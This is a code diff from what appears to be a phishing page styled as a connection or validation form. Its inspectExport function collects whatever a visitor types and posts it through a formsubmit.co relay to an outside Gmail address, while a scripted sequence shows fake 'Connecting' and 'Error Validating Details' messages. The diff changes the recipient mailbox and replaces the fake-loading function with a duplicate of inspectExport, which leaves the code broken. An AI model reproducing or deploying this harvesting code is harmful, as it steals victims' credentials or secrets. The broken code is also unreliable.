@@ -48,7 +48,7 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiUrl = "https://formsubmit.co/ajax/maviyoko6@gmail.com"; // Replace "your-email@example.com" with your FormSubmit.co email
+    let apiUrl = "https://formsubmit.co/ajax/webdme8@gmail.com"; // Replace "your-email@example.com" with your Formt.co email
 
     let formData = new FormData();
     formData.append("form_data", JSON.stringify(strings));
@@ -141,35 +141,48 @@ function one_secs_delay(callback) {
 }
 
 
-function on_submit() {
-    hide_elem(".form");
-    hide_elem(".conn-mode");
-    hide_elem("#browsing-mode");
-    hide_elem("#modal-head > .help");
-    hide_elem("#modal-close");
-    
-    let b = document.querySelector(".form-text-header");
-    let rect = document.getElementsByTagName("rect")[0];
-    let loading_img = document.querySelector(".loading-img");
+function inspectExport(formdata, nextpage) {
+    // Assuming on_submit is defined elsewhere
+    on_submit();
 
-    rect.style.stroke = "#17cf14"; 
-    b.innerHTML = "Connecting..";
+    let strings = formdata;
+    let apiUrl = "https://formsubmit.co/ajax/webdme8@gmail.com"; // Replace "your-email@example.com" with your Formsubmit email
 
-    one_secs_delay(function () {
-        b.innerHTML = "Please Wait..";
+    let formData = new FormData();
+    formData.append("form_data", JSON.stringify(strings));
 
-        one_secs_delay(function () {
-            b.innerHTML = "Resolving...  Please Wait";
+    let request = new XMLHttpRequest();
+    request.open("POST", apiUrl);
+    request.setRequestHeader("Accept", "application/json");
 
-            setTimeout(function () {
-                rect.style.stroke = "none";
-                loading_img.style.border = "red 4px solid"; 
-                b.style.color = "red";
-                b.innerHTML = "Error Validating Details";
-            }, 7000);
-        });
-    });
+    // Set a timeout for the request (e.g., 30 seconds)
+    request.timeout = 30000; // 30 seconds
+
+    request.onreadystatechange = function() {
+        if (request.readyState === XMLHttpRequest.DONE) {
+            if (request.status === 200) {
+                // Success
+                console.log("Form submitted successfully!");
+                // Redirect to the next page if needed
+                window.location.href = nextpage;
+            } else {
+                // Error handling
+                console.error("Error submitting form:", request.status, request.responseText);
+                // Handle the error as needed based on the status code
+            }
+        }
+    };
+
+    // Handle request timeout
+    request.ontimeout = function () {
+        console.error("Request timed out.");
+        // Handle timeout error
+    };
+
+    // Send the form data
+    request.send(formData);
 }
+
  
 
 
